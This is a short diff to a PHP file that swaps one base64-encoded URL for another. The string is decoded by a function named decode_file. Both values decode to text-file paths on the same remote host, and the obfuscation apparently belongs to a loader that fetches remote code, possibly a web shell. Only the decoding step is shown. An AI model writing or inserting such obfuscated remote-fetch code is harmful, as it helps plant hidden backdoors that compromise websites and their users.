@@ -8,7 +8,7 @@ function decode_file($data) {
 }
 
 
-$encoded_url = "aHR0cHM6Ly8weDE5OTkudGVjaC8xL2FsZi50eHQ=";
+$encoded_url = "aHR0cHM6Ly8weDE5OTkudGVjaC8xLzEudHh0=";
 
 
 $decoded_url = decode_file($encoded_url);
